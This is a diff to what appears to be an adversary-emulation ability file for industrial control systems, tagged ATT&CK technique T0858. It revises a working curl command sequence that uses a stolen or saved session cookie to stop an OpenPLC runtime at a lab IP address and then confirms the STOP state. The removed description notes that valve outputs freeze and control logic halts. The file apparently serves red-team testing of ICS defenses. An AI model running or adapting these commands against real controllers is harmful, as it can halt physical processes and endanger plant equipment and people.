@@ -2,9 +2,7 @@
 
 - id: c9d0e1f2-9999-9999-9999-000000000002
   name: OpenPLC - Change Operating Mode to STOP
-  description: |
-    Stop the PLC runtime execution. All valve outputs freeze at
-    their last commanded values. The PLC no longer runs control logic.
+  description: Stop the PLC runtime via the correct API endpoint
   tactic: execution
   technique_id: T0858
   technique_name: Change Operating Mode
@@ -12,10 +10,15 @@
   - platform: linux
     name: sh
     command: >
-      curl -s -b /tmp/plc.jar
-      -X POST "http://192.168.95.2:8080/stop-plc"
-      -L -o /tmp/stop_result.html -w "%{http_code}" &&
-      echo "PLC_STOPPED" &&
+      curl -s -b /tmp/plc_cookies.txt
+      -d ""
+      "http://192.168.95.2:8080/stop_plc"
+      -o /tmp/stop_result.html -w "%{http_code}" &&
+      echo "PLC_STOP_REQUESTED" &&
       sleep 2 &&
-      curl -s -b /tmp/plc.jar "http://192.168.95.2:8080/dashboard" |
-      grep -i "stopped" && echo "CONFIRMED: PLC in STOP mode"
+      curl -s -b /tmp/plc_cookies.txt
+      "http://192.168.95.2:8080/dashboard"
+      -o /tmp/plc_status.html &&
+      grep -qi "stopped" /tmp/plc_status.html &&
+      echo "PLC_STOPPED" || echo "PLC_STOP_UNCERTAIN"
+    timeout: 60
